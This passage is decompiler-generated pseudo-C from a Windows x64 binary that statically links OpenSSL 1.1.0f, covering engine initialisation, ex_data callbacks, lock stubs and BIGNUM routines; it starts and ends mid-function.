  v4 = (*(_DWORD *)(a1 + 160))-- == 1;
  if ( !v4
    || !*(_QWORD *)(a1 + 104)
    || (sub_140025CE0((_DWORD *)qword_140147E80),
        v3 = (*(__int64 (__fastcall **)(__int64))(a1 + 104))(a1),
        sub_140025D20((_DWORD *)qword_140147E80),
        v3) )
  {
    if ( (unsigned int)sub_140034DF0(a1, 0) )
      goto LABEL_9;
    sub_140024610(38, 191, 106, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\engine\\eng_init.c", 69);
  }
  v3 = 0;
LABEL_9:
  sub_140025CE0((_DWORD *)qword_140147E80);
  if ( v3 )
    return v3;
  sub_140024610(38, 107, 106, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\engine\\eng_init.c", 104);
  return 0i64;
}
// 140147E80: using guessed type __int64 qword_140147E80;

//----- (0000000140025980) ----------------------------------------------------
__int64 __fastcall sub_140025980(__int64 a1)
{
  int v1; // eax
  int v4; // eax
  int v5; // ecx
  unsigned int v6; // edi
  __int64 (__fastcall *v7)(__int64); // rax

  if ( a1 )
  {
    v4 = sub_140025C90(&dword_140142C34, (void (*)(void))sub_140034C60);
    v5 = 0;
    if ( v4 )
      v5 = dword_140142C38;
    if ( v5 )
    {
      sub_140025D20((_DWORD *)qword_140147E80);
      v6 = 1;
      if ( *(_DWORD *)(a1 + 160) || (v7 = *(__int64 (__fastcall **)(__int64))(a1 + 96)) == 0i64 || (v6 = v7(a1)) != 0 )
      {
        ++*(_DWORD *)(a1 + 156);
        ++*(_DWORD *)(a1 + 160);
      }
      sub_140025CE0((_DWORD *)qword_140147E80);
      return v6;
    }
    else
    {
      sub_140024610(38, 119, 65, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\engine\\eng_init.c", 84);
      return 0i64;
    }
  }
  else
  {
    sub_140024610(v1 - 10, v1 + 71, v1 + 19, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\engine\\eng_init.c", 80);
    return 0i64;
  }
}
// 1400259A9: variable 'v1' is possibly undefined
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 140142C34: using guessed type _DWORD dword_140142C34;
// 140142C38: using guessed type int dword_140142C38;
// 140147E80: using guessed type __int64 qword_140147E80;

//----- (0000000140025A60) ----------------------------------------------------
__int64 __fastcall sub_140025A60(__int64 a1, int a2)
{
  unsigned int v2; // edi
  bool v4; // zf

  v2 = 1;
  v4 = (*(_DWORD *)(a1 + 160))-- == 1;
  if ( v4 && *(_QWORD *)(a1 + 104) )
  {
    if ( a2 )
      sub_140025CE0((_DWORD *)qword_140147E80);
    v2 = (*(__int64 (__fastcall **)(__int64))(a1 + 104))(a1);
    if ( a2 )
      sub_140025D20((_DWORD *)qword_140147E80);
    if ( !v2 )
      return 0i64;
  }
  if ( !(unsigned int)sub_140034DF0(a1, 0) )
  {
    sub_140024610(38, 191, 106, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\engine\\eng_init.c", 69);
    return 0i64;
  }
  return v2;
}
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 140147E80: using guessed type __int64 qword_140147E80;

//----- (0000000140025B10) ----------------------------------------------------
__int64 __fastcall sub_140025B10(__int64 a1)
{
  __int64 result; // rax
  __int64 (*v3)(void); // rdx

  result = 1i64;
  if ( *(_DWORD *)(a1 + 160) || (v3 = *(__int64 (**)(void))(a1 + 96)) == 0i64 || (result = v3(), (_DWORD)result) )
  {
    ++*(_DWORD *)(a1 + 156);
    ++*(_DWORD *)(a1 + 160);
  }
  return result;
}

//----- (0000000140025B60) ----------------------------------------------------
__int64 __fastcall sub_140025B60(_DWORD *a1)
{
  *a1 = 257;
  return 1i64;
}

//----- (0000000140025B70) ----------------------------------------------------
_BOOL8 __fastcall sub_140025B70(int a1, int a2)
{
  return a1 == a2;
}

//----- (0000000140025B80) ----------------------------------------------------
__int64 __fastcall sub_140025B80(unsigned int *a1)
{
  __int64 v1; // rax

  v1 = *a1;
  if ( (unsigned int)v1 < 0x100 )
    return qword_1401422E0[v1];
  else
    return 0i64;
}
// 1401422E0: using guessed type _QWORD qword_1401422E0[256];

//----- (0000000140025BA0) ----------------------------------------------------
__int64 __fastcall sub_140025BA0(_DWORD *a1)
{
  int v1; // eax

  v1 = dword_1401422D0;
  if ( (unsigned int)dword_1401422D0 >= 0x100 )
    return 0i64;
  *a1 = dword_1401422D0;
  dword_1401422D0 = v1 + 1;
  qword_1401422E0[*a1] = 0i64;
  return 1i64;
}
// 1401422D0: using guessed type int dword_1401422D0;
// 1401422E0: using guessed type _QWORD qword_1401422E0[256];

//----- (0000000140025BE0) ----------------------------------------------------
void __fastcall sub_140025BE0(_DWORD *a1)
{
  if ( a1 )
  {
    *a1 = 0;
    sub_14001D930(a1);
  }
}

//----- (0000000140025C10) ----------------------------------------------------
_DWORD *__fastcall sub_140025C10()
{
  int v0; // eax
  _DWORD *result; // rax

  result = sub_14001DC20((unsigned int)(v0 - 36));
  if ( result )
    *result = 1;
  return result;
}
// 140025C28: variable 'v0' is possibly undefined

//----- (0000000140025C50) ----------------------------------------------------
__int64 __fastcall sub_140025C50(_DWORD *a1)
{
  int v1; // eax

  if ( *a1 != 1 )
    sub_1400234A0(
      "assertion failed: *(unsigned int *)lock == 1",
      "..\\..\\openssl-1.1.0f\\crypto\\threads_none.c",
      (unsigned int)(v1 - 13));
  return 1i64;
}
// 140025C62: variable 'v1' is possibly undefined

//----- (0000000140025C90) ----------------------------------------------------
__int64 __fastcall sub_140025C90(_DWORD *a1, void (*a2)(void))
{
  if ( !*a1 )
  {
    a2();
    *a1 = 1;
  }
  return 1i64;
}

//----- (0000000140025CC0) ----------------------------------------------------
__int64 __fastcall sub_140025CC0(unsigned int *a1, __int64 a2)
{
  __int64 v2; // rax

  v2 = *a1;
  if ( (unsigned int)v2 >= 0x100 )
    return 0i64;
  qword_1401422E0[v2] = a2;
  return 1i64;
}
// 1401422E0: using guessed type _QWORD qword_1401422E0[256];

//----- (0000000140025CE0) ----------------------------------------------------
__int64 __fastcall sub_140025CE0(_DWORD *a1)
{
  int v1; // eax

  if ( *a1 != 1 )
    sub_1400234A0(
      "assertion failed: *(unsigned int *)lock == 1",
      "..\\..\\openssl-1.1.0f\\crypto\\threads_none.c",
      (unsigned int)(v1 - 1));
  return 1i64;
}
// 140025CF2: variable 'v1' is possibly undefined

//----- (0000000140025D20) ----------------------------------------------------
__int64 __fastcall sub_140025D20(_DWORD *a1)
{
  int v1; // eax

  if ( *a1 != 1 )
    sub_1400234A0(
      "assertion failed: *(unsigned int *)lock == 1",
      "..\\..\\openssl-1.1.0f\\crypto\\threads_none.c",
      (unsigned int)(v1 - 7));
  return 1i64;
}
// 140025D32: variable 'v1' is possibly undefined

//----- (0000000140025D60) ----------------------------------------------------
__int64 __fastcall sub_140025D60(_DWORD *a1, int a2, _DWORD *a3)
{
  *a1 += a2;
  *a3 = *a1;
  return 1i64;
}

//----- (0000000140025D70) ----------------------------------------------------
__int64 __fastcall sub_140025D70(unsigned int a1, unsigned int **a2, unsigned int **a3)
{
  unsigned int v3; // ebp
  char *v5; // rsi
  __int64 result; // rax
  __int64 *v7; // r15
  int v8; // r13d
  int v9; // eax
  int v10; // edi
  __int64 i; // rbx
  unsigned int **v12; // r15
  int v13; // ebx
  __int64 j; // rdi
  __int64 v15; // rax
  __int64 v16; // rcx
  unsigned int (__fastcall *v17)(unsigned int **, unsigned int **, __int64 *, _QWORD, _DWORD, _QWORD); // r10
  __int64 v18; // [rsp+30h] [rbp-A8h] BYREF
  unsigned int **v19; // [rsp+38h] [rbp-A0h]
  char v20[80]; // [rsp+40h] [rbp-98h] BYREF

  v3 = 0;
  v19 = a2;
  v5 = 0i64;
  if ( !*a3 )
    return 1i64;
  result = (__int64)sub_1400266E0(a1);
  v7 = (__int64 *)result;
  if ( result )
  {
    v8 = sub_1400296E0(*(unsigned int **)result);
    v9 = sub_1400296E0(*a3);
    if ( v9 < v8 )
      v8 = v9;
    if ( v8 > 0 )
    {
      if ( v8 >= 10 )
      {
        v5 = (char *)sub_14001D8E0(8i64 * v8);
        if ( !v5 )
          goto LABEL_12;
      }
      else
      {
        v5 = v20;
      }
      v10 = 0;
      for ( i = 0i64; i < v8; *(_QWORD *)&v5[8 * i++] = sub_140029880(*v7, v10++) )
        ;
    }
LABEL_12:
    sub_140025CE0((_DWORD *)qword_140142AE0);
    if ( v8 )
    {
      if ( v5 )
      {
        v12 = v19;
        if ( (unsigned int)sub_140026520(v19, v8 - 1, 0i64) )
        {
          v13 = 0;
          for ( j = 0i64; j < v8; ++j )
          {
            if ( *a3 && v13 < (int)sub_1400296E0(*a3) )
              v15 = sub_140029880((__int64)*a3, v13);
            else
              v15 = 0i64;
            v18 = v15;
            v16 = *(_QWORD *)&v5[8 * j];
            if ( v16 )
            {
              v17 = *(unsigned int (__fastcall **)(unsigned int **, unsigned int **, __int64 *, _QWORD, _DWORD, _QWORD))(v16 + 32);
              if ( v17 )
              {
                if ( !v17(v12, a3, &v18, (unsigned int)v13, *(_DWORD *)v16, *(_QWORD *)(v16 + 8)) )
                  goto LABEL_28;
                v15 = v18;
              }
            }
            sub_140026520(v12, v13++, v15);
          }
          v3 = 1;
        }
LABEL_28:
        if ( v5 != v20 )
          sub_14001D930(v5);
        return v3;
      }
      else
      {
        sub_140024610(15, 110, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ex_data.c", 287);
        return 0i64;
      }
    }
    else
    {
      return 1i64;
    }
  }
  return result;
}
// 140025E3F: conditional instruction was optimized away because r13d.4>=1
// 140142AE0: using guessed type __int64 qword_140142AE0;

//----- (0000000140025FB0) ----------------------------------------------------
void __fastcall sub_140025FB0(unsigned int a1, __int64 a2, __int64 *a3)
{
  char *v5; // r14
  char *v6; // rax
  __int64 *v7; // r12
  int v8; // eax
  __int64 v9; // rbp
  int v10; // edi
  __int64 i; // rbx
  int v12; // edi
  __int64 j; // rsi
  __int64 v14; // rbx
  __int64 v15; // rdx
  char v16[80]; // [rsp+30h] [rbp-98h] BYREF

  v5 = 0i64;
  v6 = sub_1400266E0(a1);
  v7 = (__int64 *)v6;
  if ( !v6 )
    goto LABEL_22;
  v8 = sub_1400296E0(*(unsigned int **)v6);
  v9 = v8;
  if ( v8 > 0 )
  {
    if ( v8 < 10 )
    {
      v5 = v16;
      goto LABEL_6;
    }
    v5 = (char *)sub_14001D8E0(8i64 * v8);
    if ( v5 )
    {
LABEL_6:
      v10 = 0;
      for ( i = 0i64; i < v9; ++i )
        *(_QWORD *)&v5[8 * i] = sub_140029880(*v7, v10++);
    }
  }
  sub_140025CE0((_DWORD *)qword_140142AE0);
  v12 = 0;
  for ( j = 0i64; j < v9; ++j )
  {
    if ( v5 )
    {
      v14 = *(_QWORD *)&v5[8 * j];
    }
    else
    {
      sub_140025D20((_DWORD *)qword_140142AE0);
      v14 = sub_140029880(*v7, v12);
      sub_140025CE0((_DWORD *)qword_140142AE0);
    }
    if ( v14 && *(_QWORD *)(v14 + 24) )
    {
      if ( *a3 && v12 < (int)sub_1400296E0((unsigned int *)*a3) )
        v15 = sub_140029880(*a3, v12);
      else
        v15 = 0i64;
      (*(void (__fastcall **)(__int64, __int64, __int64 *, _QWORD, _DWORD, _QWORD))(v14 + 24))(
        a2,
        v15,
        a3,
        (unsigned int)v12,
        *(_DWORD *)v14,
        *(_QWORD *)(v14 + 8));
    }
    ++v12;
  }
  if ( v5 != v16 )
    sub_14001D930(v5);
LABEL_22:
  sub_1400294B0((void **)*a3);
  *a3 = 0i64;
}
// 140142AE0: using guessed type __int64 qword_140142AE0;

//----- (0000000140026190) ----------------------------------------------------
__int64 __fastcall sub_140026190(__int64 *a1, int a2)
{
  unsigned int *v4; // rcx

  v4 = (unsigned int *)*a1;
  if ( v4 && a2 < (int)sub_1400296E0(v4) )
    return sub_140029880(*a1, a2);
  else
    return 0i64;
}

//----- (00000001400261E0) ----------------------------------------------------
__int64 __fastcall sub_1400261E0(unsigned int a1, int a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6)
{
  unsigned int v9; // ebx
  char *v10; // rax
  unsigned int **v11; // rdi
  int *v12; // rax
  _DWORD *v13; // rax
  void *v14; // rsi

  v9 = -1;
  v10 = sub_1400266E0(a1);
  v11 = (unsigned int **)v10;
  if ( v10 )
  {
    if ( *(_QWORD *)v10
      || (v12 = (int *)sub_1400296C0(), (*v11 = (unsigned int *)v12) != 0i64) && (unsigned int)sub_1400297C0(v12, 0i64) )
    {
      v13 = sub_14001D8E0(0x28ui64);
      v14 = v13;
      if ( v13 )
      {
        *v13 = a2;
        *((_QWORD *)v13 + 1) = a3;
        *((_QWORD *)v13 + 2) = a4;
        *((_QWORD *)v13 + 4) = a5;
        *((_QWORD *)v13 + 3) = a6;
        if ( (unsigned int)sub_1400297C0((int *)*v11, 0i64) )
        {
          v9 = sub_1400296E0(*v11) - 1;
          sub_1400297E0((__int64)*v11, v9, (__int64)v14);
        }
        else
        {
          sub_140024610(15, 100, 65, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\ex_data.c", 189);
          sub_14001D930(v14);
        }
      }
      else
      {
        sub_140024610(15, 100, 65, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\ex_data.c", 179);
      }
    }
    else
    {
      sub_140024610(15, 100, 65, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\ex_data.c", 172);
    }
    sub_140025CE0((_DWORD *)qword_140142AE0);
  }
  return v9;
}
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 140142AE0: using guessed type __int64 qword_140142AE0;

//----- (0000000140026350) ----------------------------------------------------
char *__fastcall sub_140026350(unsigned int a1, __int64 a2, __int64 *a3)
{
  char *v5; // rsi
  char *result; // rax
  __int64 *v7; // r12
  int v8; // eax
  int v9; // r15d
  __int64 v10; // rbp
  int v11; // edi
  __int64 v12; // rbx
  int v13; // edi
  __int64 i; // rbx
  __int64 v15; // rax
  __int64 v16; // rdx
  char v17[80]; // [rsp+30h] [rbp-98h] BYREF

  v5 = 0i64;
  result = sub_1400266E0(a1);
  v7 = (__int64 *)result;
  if ( !result )
    return result;
  *a3 = 0i64;
  v8 = sub_1400296E0(*(unsigned int **)result);
  v9 = v8;
  v10 = v8;
  if ( v8 > 0 )
  {
    if ( v8 < 10 )
    {
      v5 = v17;
      goto LABEL_6;
    }
    v5 = (char *)sub_14001D8E0(8i64 * v8);
    if ( v5 )
    {
LABEL_6:
      v11 = 0;
      v12 = 0i64;
      if ( v9 > 0 )
      {
        do
          *(_QWORD *)&v5[8 * v12++] = sub_140029880(*v7, v11++);
        while ( v12 < v10 );
      }
    }
  }
  sub_140025CE0((_DWORD *)qword_140142AE0);
  if ( v9 <= 0 || v5 )
  {
    v13 = 0;
    for ( i = 0i64; i < v10; ++i )
    {
      v15 = *(_QWORD *)&v5[8 * i];
      if ( v15 && *(_QWORD *)(v15 + 16) )
      {
        if ( *a3 && v13 < (int)sub_1400296E0((unsigned int *)*a3) )
          v16 = sub_140029880(*a3, v13);
        else
          v16 = 0i64;
        (*(void (__fastcall **)(__int64, __int64, __int64 *, _QWORD, _DWORD, _QWORD))(*(_QWORD *)&v5[8 * i] + 16i64))(
          a2,
          v16,
          a3,
          (unsigned int)v13,
          **(_DWORD **)&v5[8 * i],
          *(_QWORD *)(*(_QWORD *)&v5[8 * i] + 8i64));
      }
      ++v13;
    }
    if ( v5 != v17 )
      sub_14001D930(v5);
    return (char *)1;
  }
  else
  {
    sub_140024610(15, 112, 65, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\ex_data.c", 234);
    return 0i64;
  }
}
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 140142AE0: using guessed type __int64 qword_140142AE0;

//----- (0000000140026520) ----------------------------------------------------
__int64 __fastcall sub_140026520(unsigned int **a1, int a2, __int64 a3)
{
  unsigned int *v6; // rax
  int v8; // ebx

  if ( *a1 || (v6 = (unsigned int *)sub_1400296C0(), (*a1 = v6) != 0i64) )
  {
    v8 = sub_1400296E0(*a1);
    if ( v8 > a2 )
    {
LABEL_7:
      sub_1400297E0((__int64)*a1, a2, a3);
      return 1i64;
    }
    else
    {
      while ( (unsigned int)sub_1400297C0((int *)*a1, 0i64) )
      {
        if ( ++v8 > a2 )
          goto LABEL_7;
      }
      sub_140024610(15, 102, 65, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\ex_data.c", 375);
      return 0i64;
    }
  }
  else
  {
    sub_140024610(15, 102, 65, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\ex_data.c", 368);
    return 0i64;
  }
}
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (0000000140026600) ----------------------------------------------------
void __fastcall sub_140026600(void *a1)
{
  sub_14001D930(a1);
}

//----- (0000000140026630) ----------------------------------------------------
void sub_140026630()
{
  void **v0; // rbx

  v0 = (void **)&unk_140142AF0;
  do
  {
    sub_140029720(*v0, (void (*)(void))sub_140026600);
    *v0++ = 0i64;
  }
  while ( (__int64)v0 < (__int64)&unk_140142B60 );
  sub_140025BE0((_DWORD *)qword_140142AE0);
  qword_140142AE0 = 0i64;
}
// 140142AE0: using guessed type __int64 qword_140142AE0;

//----- (00000001400266A0) ----------------------------------------------------
_DWORD *sub_1400266A0()
{
  _DWORD *result; // rax

  sub_14001E0C0(0i64, 0i64);
  result = sub_140025C10();
  qword_140142AE0 = (__int64)result;
  dword_140142AEC = result != 0i64;
  return result;
}
// 14001E0C0: using guessed type __int64 __fastcall sub_14001E0C0(_QWORD, _QWORD);
// 140142AE0: using guessed type __int64 qword_140142AE0;
// 140142AEC: using guessed type int dword_140142AEC;

//----- (00000001400266E0) ----------------------------------------------------
char *__fastcall sub_1400266E0(unsigned int a1)
{
  __int64 v1; // rbx
  int v2; // eax
  int v3; // edx

  v1 = (int)a1;
  if ( a1 > 0xD )
  {
    sub_140024610(15, 113, 7, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\ex_data.c", 55);
  }
  else
  {
    v2 = sub_140025C90(&dword_140142AE8, (void (*)(void))sub_1400266A0);
    v3 = 0;
    if ( v2 )
      v3 = dword_140142AEC;
    if ( v3 )
    {
      if ( qword_140142AE0 )
      {
        sub_140025D20((_DWORD *)qword_140142AE0);
        return (char *)&unk_140142AF0 + 8 * v1;
      }
    }
    else
    {
      sub_140024610(15, 113, 65, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\ex_data.c", 60);
    }
  }
  return 0i64;
}
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 140142AE0: using guessed type __int64 qword_140142AE0;
// 140142AE8: using guessed type _DWORD dword_140142AE8;
// 140142AEC: using guessed type int dword_140142AEC;

//----- (0000000140026780) ----------------------------------------------------
void __fastcall sub_140026780(void *a1)
{
  if ( a1 )
    sub_14001D930(a1);
}

//----- (00000001400267B0) ----------------------------------------------------
void *__fastcall sub_1400267B0()
{
  int v0; // eax
  void *result; // rax

  result = sub_14001D8E0((unsigned int)(v0 - 32));
  if ( !result )
  {
    sub_140024610(3, 143, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\bn\\bn_lib.c", 967);
    return 0i64;
  }
  return result;
}
// 1400267CA: variable 'v0' is possibly undefined

//----- (0000000140026800) ----------------------------------------------------
void __fastcall sub_140026800(__int64 a1, __int64 a2, __int64 a3)
{
  *(_DWORD *)a1 = 2;
  *(_QWORD *)(a1 + 8) = a3;
  *(_QWORD *)(a1 + 16) = a2;
}

//----- (0000000140026810) ----------------------------------------------------
_BOOL8 __fastcall sub_140026810(__int64 a1, __int64 a2)
{
  int v2; // r8d

  v2 = *(_DWORD *)(a1 + 8);
  return v2 == 1 && **(_QWORD **)a1 == a2 || !a2 && !v2;
}

//----- (0000000140026840) ----------------------------------------------------
__int64 __fastcall sub_140026840(_BYTE *a1, int a2, __int64 a3)
{
  int v3; // eax
  _DWORD *v4; // r15
  __int64 v5; // rdi
  _DWORD *v8; // rax
  bool v10; // zf
  int v11; // r14d
  __int64 v12; // rbp
  _QWORD *v13; // rax
  __int64 v14; // rdx
  __int64 v15; // rax
  __int64 v16; // rdx
  __int64 v17; // r8

  v4 = 0i64;
  v5 = a3;
  if ( !a3 )
  {
    v8 = sub_14001DC20((unsigned int)(v3 - 24));
    v5 = (__int64)v8;
    if ( !v8 )
    {
      sub_140024610(3, 113, 65, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\bn\\bn_lib.c", 228);
      return 0i64;
    }
    v8[5] = 1;
    v4 = v8;
  }
  v10 = a2 == 0;
  if ( a2 > 0 )
  {
    do
    {
      if ( *a1 )
        break;
      ++a1;
      --a2;
    }
    while ( a2 > 0 );
    v10 = a2 == 0;
  }
  if ( v10 )
  {
    *(_DWORD *)(v5 + 8) = 0;
    return v5;
  }
  else
  {
    v11 = (a2 - 1) & 7;
    LODWORD(v12) = ((unsigned int)(a2 - 1) >> 3) + 1;
    if ( (int)v12 > *(_DWORD *)(v5 + 12) )
      v13 = sub_140027910(v5, v12);
    else
      v13 = (_QWORD *)v5;
    if ( v13 )
    {
      *(_DWORD *)(v5 + 8) = v12;
      v14 = 0i64;
      *(_DWORD *)(v5 + 16) = 0;
      do
      {
        v15 = (unsigned __int8)*a1++;
        --a2;
        v14 = v15 | (v14 << 8);
        LODWORD(v15) = v11--;
        if ( !(_DWORD)v15 )
        {
          v12 = (unsigned int)(v12 - 1);
          *(_QWORD *)(*(_QWORD *)v5 + 8 * v12) = v14;
          v14 = 0i64;
          v11 = 7;
        }
      }
      while ( a2 );
      v16 = *(int *)(v5 + 8);
      if ( (int)v16 > 0 )
      {
        v17 = *(_QWORD *)v5 + 8 * v16;
        do
        {
          v10 = *(_QWORD *)(v17 - 8) == 0i64;
          v17 -= 8i64;
          if ( !v10 )
            break;
          LODWORD(v16) = v16 - 1;
        }
        while ( (int)v16 > 0 );
        *(_DWORD *)(v5 + 8) = v16;
      }
      if ( !*(_DWORD *)(v5 + 8) )
        *(_DWORD *)(v5 + 16) = 0;
      return v5;
    }
    else
    {
      sub_140026FF0(v4);
      return 0i64;
    }
  }
}
// 140026873: variable 'v3' is possibly undefined
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (00000001400269C0) ----------------------------------------------------
__int64 __fastcall sub_1400269C0(__int64 a1, _BYTE *a2)
{
  return sub_140027690(a1, a2, -1);
}

//----- (00000001400269E0) ----------------------------------------------------
__int64 __fastcall sub_1400269E0(__int64 a1, _BYTE *a2, int a3)
{
  if ( a3 >= 0 )
    return sub_140027690(a1, a2, a3);
  else
    return 0xFFFFFFFFi64;
}

//----- (0000000140026A10) ----------------------------------------------------
void __fastcall sub_140026A10(__int64 *a1)
{
  __int64 v2; // rcx
  int v3; // eax
  void *v4; // rcx
  int v5; // ebx

  if ( a1 )
  {
    v2 = *a1;
    if ( v2 )
    {
      sub_140023440(v2, 8i64 * *((int *)a1 + 3));
      v3 = *((_DWORD *)a1 + 5);
      if ( (v3 & 2) == 0 )
      {
        v4 = (void *)*a1;
        if ( (v3 & 8) != 0 )
          sub_140041990(v4);
        else
          sub_14001D930(v4);
      }
    }
    v5 = *((_DWORD *)a1 + 5);
    sub_140023440((__int64)a1, 24i64);
    if ( (v5 & 1) != 0 )
      sub_14001D930(a1);
  }
}

//----- (0000000140026AB0) ----------------------------------------------------
__int64 __fastcall sub_140026AB0(__int64 a1, __int64 *a2)
{
  __int64 result; // rax
  int v3; // r8d
  unsigned int v4; // r9d
  bool v5; // zf
  unsigned int v6; // r11d
  int v7; // r8d
  int v8; // eax
  int v9; // r8d
  __int64 v10; // rax
  __int64 v11; // rdx
  __int64 v12; // r10
  unsigned __int64 *i; // rcx
  unsigned __int64 v14; // rax

  if ( !a1 )
    return a2 != 0i64;
  result = 0xFFFFFFFFi64;
  if ( !a2 )
    return result;
  v3 = *(_DWORD *)(a1 + 16);
  v4 = 1;
  if ( v3 != *((_DWORD *)a2 + 4) )
  {
    if ( v3 )
      return (unsigned int)-1;
    return v4;
  }
  v5 = v3 == 0;
  v6 = -1;
  v7 = *((_DWORD *)a2 + 2);
  if ( !v5 )
  {
    v6 = 1;
    v4 = -1;
  }
  v8 = *(_DWORD *)(a1 + 8);
  if ( v8 > v7 )
    return v4;
  if ( v8 < v7 )
    return v6;
  v9 = v8 - 1;
  if ( v8 - 1 >= 0 )
  {
    v10 = *a2;
    v11 = v9;
    v12 = *(_QWORD *)a1 - v10;
    for ( i = (unsigned __int64 *)(v10 + 8i64 * v9); ; --i )
    {
      v14 = *(unsigned __int64 *)((char *)i + v12);
      if ( v14 > *i )
        break;
      if ( v14 < *i )
        return v6;
      if ( --v11 < 0 )
        return 0i64;
    }
    return v4;
  }
  return 0i64;
}

//----- (0000000140026B40) ----------------------------------------------------
__int64 __fastcall sub_140026B40(__int64 a1, _DWORD *a2, _DWORD *a3, int a4)
{
  unsigned __int64 v4; // rbx
  int v6; // ecx
  int v7; // r10d
  __m128i v8; // xmm3
  int v9; // edx
  unsigned int v10; // ecx
  __int64 v11; // r14
  __int64 v12; // rax
  __int64 v13; // r15
  unsigned __int64 v14; // rsi
  unsigned __int64 v15; // r10
  unsigned __int64 v16; // rax
  unsigned __int64 v17; // rdi
  int v18; // eax
  __int64 v19; // rcx
  __m128i v20; // xmm1
  __m128i v21; // xmm2
  __m128i v22; // xmm2
  __m128i v23; // xmm1
  __m128i v24; // xmm2
  __int64 v25; // r10
  __int64 i; // rdi
  __int64 v27; // rcx
  unsigned __int64 v28; // r9
  __int64 v29; // rcx
  unsigned __int64 v30; // rdx
  __int64 v31; // rcx
  unsigned __int64 v32; // rdx
  __int64 v33; // rcx
  unsigned __int64 v34; // rdx
  __int64 v35; // rcx
  unsigned __int64 v36; // rdx
  __int64 v37; // rcx
  unsigned __int64 v38; // rdx
  __int64 v39; // rcx
  unsigned __int64 v40; // rdx
  __int64 v41; // rcx
  unsigned __int64 v42; // rdx
  __int64 v43; // rcx
  unsigned __int64 v44; // rdx
  __int64 v45; // rcx
  unsigned __int64 v46; // rdx
  __int64 v47; // rdx
  unsigned __int64 v48; // rcx
  __int64 result; // rax

  v4 = ((unsigned __int64)(a1 - 1) >> 63) - 1;
  v6 = v4 & (a3[2] ^ a2[2]);
  a2[2] ^= v6;
  v7 = a4 - 1;
  a3[2] ^= v6;
  v8 = _mm_unpacklo_epi64((__m128i)v4, (__m128i)v4);
  switch ( a4 )
  {
    case 1:
      goto LABEL_27;
    case 2:
      goto LABEL_26;
    case 3:
      goto LABEL_25;
    case 4:
      goto LABEL_24;
    case 5:
      goto LABEL_23;
    case 6:
      goto LABEL_22;
    case 7:
      goto LABEL_21;
    case 8:
      goto LABEL_20;
    case 9:
      goto LABEL_19;
    case 10:
      goto LABEL_18;
    default:
      v9 = 10;
      v10 = a4 - 10;
      if ( a4 > 10 && v10 >= 4 )
      {
        v11 = *(_QWORD *)a3;
        v12 = v7;
        v13 = *(_QWORD *)a2;
        v14 = *(_QWORD *)a3 + 80i64;
        v15 = *(_QWORD *)a3 + 8i64 * v7;
        v16 = *(_QWORD *)a2 + 8 * v12;
        v17 = *(_QWORD *)a2 + 80i64;
        if ( (v14 > v16 || v15 < v17)
          && (v14 > (unsigned __int64)a3 || v15 < (unsigned __int64)a3)
          && (v14 > (unsigned __int64)a2 || v15 < (unsigned __int64)a2)
          && (v17 > (unsigned __int64)a3 || v16 < (unsigned __int64)a3)
          && (v17 > (unsigned __int64)a2 || v16 < (unsigned __int64)a2) )
        {
          v18 = a4 - (int)v10 % 4;
          v19 = 80i64;
          do
          {
            v20 = _mm_loadu_si128((const __m128i *)(v13 + v19));
            v9 += 4;
            v21 = _mm_loadu_si128((const __m128i *)(v11 + v19));
            v19 += 32i64;
            v22 = _mm_and_si128(_mm_xor_si128(v21, v20), v8);
            *(__m128i *)(v13 + v19 - 32) = _mm_xor_si128(v22, v20);
            *(__m128i *)(v11 + v19 - 32) = _mm_xor_si128(_mm_loadu_si128((const __m128i *)(v11 + v19 - 32)), v22);
            v23 = _mm_loadu_si128((const __m128i *)(v13 + v19 - 16));
            v24 = _mm_and_si128(_mm_xor_si128(v23, _mm_loadu_si128((const __m128i *)(v11 + v19 - 16))), v8);
            *(__m128i *)(v13 + v19 - 16) = _mm_xor_si128(v24, v23);
            *(__m128i *)(v11 + v19 - 16) = _mm_xor_si128(v24, _mm_loadu_si128((const __m128i *)(v11 + v19 - 16)));
          }
          while ( v9 < v18 );
        }
      }
      v25 = v9;
      for ( i = a4; v25 < i; ++v25 )
      {
        v27 = *(_QWORD *)(*(_QWORD *)a2 + 8 * v25);
        v28 = v4 & (v27 ^ *(_QWORD *)(*(_QWORD *)a3 + 8 * v25));
        *(_QWORD *)(*(_QWORD *)a2 + 8 * v25) = v28 ^ v27;
        *(_QWORD *)(*(_QWORD *)a3 + 8 * v25) ^= v28;
      }
LABEL_18:
      v29 = *(_QWORD *)(*(_QWORD *)a2 + 72i64);
      v30 = v4 & (v29 ^ *(_QWORD *)(*(_QWORD *)a3 + 72i64));
      *(_QWORD *)(*(_QWORD *)a2 + 72i64) = v30 ^ v29;
      *(_QWORD *)(*(_QWORD *)a3 + 72i64) ^= v30;
LABEL_19:
      v31 = *(_QWORD *)(*(_QWORD *)a2 + 64i64);
      v32 = v4 & (v31 ^ *(_QWORD *)(*(_QWORD *)a3 + 64i64));
